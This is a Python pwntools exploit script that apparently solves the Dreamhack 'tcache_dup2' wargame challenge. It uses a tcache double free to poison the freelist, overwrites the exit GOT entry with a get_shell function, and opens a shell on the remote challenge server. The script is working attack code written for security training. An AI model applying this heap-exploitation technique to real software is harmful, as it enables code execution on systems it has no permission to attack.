#!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"
context.binary = elf = ELF('./tcache_dup2_patched')
libc = ELF('./libc-2.30.so')

def add(size, data) -> None:
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)
    return None 

def delete(idx) -> None:
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx))
    return None 

def modify(idx, size, data) -> None:
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter('Data: ', data)
    return None 

# p = process('./tcache_dup2_patched')
p = remote('host3.dreamhack.games', 12160)
add(0x20, b'aaa')
add(0x20, b'aaa')
delete(1)
delete(0)
modify(0, 0x10, b'a' * 0x10)
delete(0) 

add(0x20, p64(elf.got["exit"]))
# add(0x20, p64(elf.got["puts"]))
add(0x20, p64(0))
add(0x20, p64(elf.symbols["get_shell"]))
delete(8)
p.interactive()
